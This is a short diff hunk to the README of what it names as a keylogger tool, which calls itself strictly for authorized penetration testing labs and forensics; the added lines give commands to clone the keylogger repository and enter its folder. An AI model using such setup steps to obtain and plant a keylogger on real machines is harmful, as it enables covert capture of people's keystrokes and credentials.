@@ -175,3 +175,6 @@ This project is strictly for authorized penetration testing labs and digital for
    ## Step‑by‑Step Setup
 
    1. Clone or download the script
+      
+            git clone https://github.com/darnxd/darnxd-keylogger-2.0.git
+            cd darnxd-keylogger-2.0
